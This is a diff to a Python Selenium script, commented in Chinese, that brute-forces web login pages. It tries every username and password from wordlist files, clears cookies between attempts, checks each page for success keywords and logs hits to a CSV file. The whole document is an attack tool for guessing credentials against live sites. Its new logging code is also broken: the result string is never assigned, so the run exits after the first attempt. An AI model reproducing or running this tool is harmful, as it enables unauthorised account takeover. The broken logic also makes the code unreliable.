@@ -2,6 +2,10 @@
 # encoding: utf-8
 import time
 import sys
+
+from lib.util import list_in_str
+from setting import RESULT_FILE_ENCODING, SUCCESS_KEY_LIST
+
 sys.dont_write_bytecode = True
 from selenium import webdriver
 from selenium.webdriver.common import action_chains
@@ -89,12 +93,13 @@ def browser_get_elem(moudle, browser, elem_find_dict):
 
 
 def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
-               user_id=None, user_class=None, user_name=None,user_css_selector=None,
-               pass_id=None, pass_class=None, pass_name=None,pass_css_selector=None,
-               button_id=None, button_class=None, button_name=None,button_css_selector=None,
-               keyword='success'):
+               user_id=None, user_class=None, user_name=None, user_css_selector=None,
+               pass_id=None, pass_class=None, pass_name=None, pass_css_selector=None,
+               button_id=None, button_class=None, button_name=None, button_css_selector=None,
+               success_key_list=['success']):
     try:
         action = action_chains.ActionChains(browser)
+        browser.delete_all_cookies()  # 清除cookie
         browser.get(login_url)
 
         time.sleep(time_1)  # 延迟时间
@@ -159,16 +164,24 @@ def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
         f_BruteLog.close()
 
         # 自定义匹返回页面匹配关键字
-        if keyword in browser.page_source:
-            keyword_result = "{}|{}|{} 成功匹配到登录成功关键字: {}".format(user, pwd, str(currentPageUrl), keyword)
+        result_str = None
+        if list_in_str(success_key_list, browser.page_source, default=True):
+            keyword_result = "{}|{}|{} 成功匹配到登录成功关键字列表: {}".format(user, pwd, str(currentPageUrl), success_key_list)
             print('[+] 匹配结果: {}'.format(keyword_result))
-            f_Success = open("Brute-Keyword.txt", "a+")
-            f_Success.write(keyword_result + '\n')
-            f_Success.close()
-
+            status = "匹配关键字成功"
         else:
-            keyword_result = '{}|{}|{} 没有匹配到登录成功关键字: {} '.format(user, pwd, str(currentPageUrl), keyword)
+            keyword_result = '{}|{}|{} 没有匹配到登录成功关键字列表: {} '.format(user, pwd, str(currentPageUrl), success_key_list)
             print('[-] 匹配结果: {}'.format(keyword_result))
+            status = "匹配关键字失败"
+
+        if result_str:
+            result_str = '"user:{}","pwd:{}","Url:{}","keyword:{}","status:{}"'.format(user, pwd, str(currentPageUrl), success_key_list, status)
+            f_result = open("Brute-Result.csv", "a+", encoding=RESULT_FILE_ENCODING)
+            f_result.write(result_str + '\n')
+            f_result.close()
+        else:
+            print('[!] 发生错误!!!结果字符串未被赋值,请检查代码错误...')
+            exit()
 
     except KeyboardInterrupt as error:
         print('[-] KeyboardInterrupt:{}'.format(error))
@@ -182,22 +195,22 @@ def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
 
 
 def BatchBruteLogin(login_url=None, time_1=1, time_2=1,
-                    user_id=None, user_name=None,user_class=None,user_css_selector=None,
-                    pass_id=None, pass_name=None, pass_class=None,pass_css_selector=None,
-                    button_id=None,button_name=None, button_class=None,button_css_selector=None,
-                    user_dict='username.txt', pass_dict='password.txt', keyword='success'):
-    with open(user_dict, 'r', ) as fuser:
-        for user in fuser.readlines():
+                    user_id=None, user_name=None, user_class=None, user_css_selector=None,
+                    pass_id=None, pass_name=None, pass_class=None, pass_css_selector=None,
+                    button_id=None, button_name=None, button_class=None, button_css_selector=None,
+                    user_dict='username.txt', pass_dict='password.txt', success_key_list=['success']):
+    with open(user_dict, 'r', ) as f_user:
+        for user in f_user.readlines():
             user = user.strip()
-            with open(pass_dict, 'r') as fpwd:
-                for pwd in fpwd.readlines():
+            with open(pass_dict, 'r') as f_pwd:
+                for pwd in f_pwd.readlines():
                     pwd = pwd.strip()
                     print('[*] 开始测试: {},{}'.format(user, pwd))
                     BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
                                user_id=user_id, user_name=user_name, user_class=user_class, user_css_selector=user_css_selector,
                                pass_id=pass_id, pass_name=pass_name, pass_class=pass_class, pass_css_selector=pass_css_selector,
                                button_id=button_id, button_name=button_name, button_class=button_class, button_css_selector=button_css_selector,
-                               keyword=keyword)
+                               success_key_list=success_key_list)
 
 
 if __name__ == '__main__':
@@ -227,10 +240,10 @@ if __name__ == '__main__':
     try:
         # 开始进行批量爆破
         BatchBruteLogin(login_url=config.login_url, time_1=config.time_1, time_2=config.time_2,
-                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name,user_css_selector=config.user_css_selector,
-                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name,pass_css_selector=config.pass_css_selector,
+                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name, user_css_selector=config.user_css_selector,
+                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name, pass_css_selector=config.pass_css_selector,
                         button_id=config.button_id, button_class=config.button_class, button_name=config.button_name, button_css_selector=config.button_css_selector,
-                        user_dict=config.user_dict, pass_dict=config.pass_dict, keyword=config.keyword)
+                        user_dict=config.user_dict, pass_dict=config.pass_dict, success_key_list=SUCCESS_KEY_LIST)
     except Exception as error:
         print("[!] 注意:爆破模块发生错误,错误内容：{}".format(error))
     finally:
